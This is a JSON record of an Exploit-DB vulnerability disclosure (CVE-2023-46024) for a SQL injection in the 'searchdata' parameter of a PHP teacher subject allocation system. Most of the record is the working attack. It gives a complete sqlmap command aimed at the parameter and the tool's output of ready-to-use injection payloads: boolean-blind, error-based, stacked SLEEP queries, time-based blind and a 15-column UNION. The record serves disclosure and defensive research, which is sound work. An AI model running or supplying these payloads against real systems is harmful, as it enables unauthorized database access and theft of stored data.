{"source": "https://www.exploit-db.com/exploits/51914", "vulnName": "Teacher Subject Allocation Management System 1.0 - 'searchdata' SQLi", "vulnEDBID": "51914", "vulnCVE": "2023-46024", "author": "ERSIN ERENLER", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-03-20", "vulnContent": "# Exploit Title: Teacher Subject Allocation Management System 1.0 - 'searchdata' SQLi\n# Date: 2023-11-15\n# Exploit Author: Ersin Erenler\n# Vendor Homepage: https://phpgurukul.com/teacher-subject-allocation-system-using-php-and-mysql\n# Software Link: https://phpgurukul.com/?sdm_process_download=1&download_id=17645\n# Version: 1.0\n# Tested on: Windows/Linux, Apache 2.4.54, PHP 8.2.0\n# CVE : CVE-2023-46024\n\n-------------------------------------------------------------------------------\n\n# Description:\n\nTeacher Subject Allocation Management System V1.0 is susceptible to a significant security vulnerability that arises from insufficient protection on the 'searchdata' parameter in the index.php file. This flaw can potentially be exploited to inject malicious SQL queries, leading to unauthorized access and extraction of sensitive information from the database.\n\nVulnerable File: /index.php\n\nParameter Name: searchdata\n\n# Proof of Concept:\n----------------------\n\nExecute sqlmap using either the 'searchdata' parameter to retrieve the current database:\n\nsqlmap -u \"http://localhost/Tsas\" --method POST --data \"searchdata=test&search=\" -p searchdata --risk 3 --level 3 --dbms mysql --batch --current-db\n\nSQLMap Response:\n----------------------\n---\nParameter: searchdata (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: searchdata=test%' AND 3912=3912 AND 'qxHV%'='qxHV&search=\n\n    Type: error-based\n    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n    Payload: searchdata=test%' AND (SELECT 1043 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(1043=1043,1))),0x717a787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'kewe%'='kewe&search=\n\n    Type: stacked queries\n    Title: MySQL >= 5.0.12 stacked queries (comment)\n    Payload: searchdata=test%';SELECT SLEEP(5)#&search=\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: searchdata=test%' AND (SELECT 8862 FROM (SELECT(SLEEP(5)))GqzT) AND 'wylU%'='wylU&search=\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 15 columns\n    Payload: searchdata=test%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170706a71,0x784e7a47626a794a74456975444c5a4c64734556414658476e75684c4a716f6173724b6b6a685163,0x717a787171)-- -&search=\n---\n            "}